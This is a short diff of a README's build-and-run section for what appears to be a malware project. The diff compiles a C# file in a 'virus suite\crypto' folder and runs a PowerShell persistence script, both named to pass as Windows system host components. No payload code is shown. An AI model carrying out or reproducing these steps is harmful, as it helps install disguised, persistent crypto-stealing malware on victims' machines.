@@ -48,8 +48,7 @@ copy the address in parts. The latter being the most efficient option.
 
 ## COMPILATION AND USAGE
 ``` 
-cd '.\src\main\c#\virus suite\crypto\app\'
-csc .\sys_host_dl_v4.0.30319_69.cs
+csc '.\src\main\c#\virus suite\crypto\app\sys_host_dl_v4.0.30319_69.cs'
 cd src/main/c#/scripts/powershell
 ./sys_host_dl_v4.0.30319_64_persistence.ps1
 ```
